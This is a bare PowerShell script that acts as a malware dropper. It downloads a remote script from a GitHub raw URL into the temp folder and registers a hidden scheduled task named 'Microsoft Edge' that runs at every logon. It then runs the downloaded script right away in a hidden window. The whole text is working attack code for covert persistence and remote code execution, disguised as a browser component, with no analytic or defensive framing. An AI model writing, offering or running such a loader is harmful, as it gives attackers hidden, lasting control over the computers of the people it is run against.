# Setting variables
$URL = "https://raw.githubusercontent.com/kasaotnic4422/fatbitchmuseum/main/Microsoft%20Edge.ps1"
$OutputFile = "$env:TEMP\Microsoft%20Edge.ps1"
$TaskName = "Microsoft%20Edge"
$TaskAction = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -WindowStyle Hidden -File $OutputFile"
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries

# Downloading the PowerShell script
Invoke-WebRequest -Uri $URL -OutFile $OutputFile

# Create a Task Scheduler task for persistence
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings

# Run the downloaded PowerShell script silently in the background
Start-Process PowerShell -ArgumentList "-NoProfile -WindowStyle Hidden -File $OutputFile"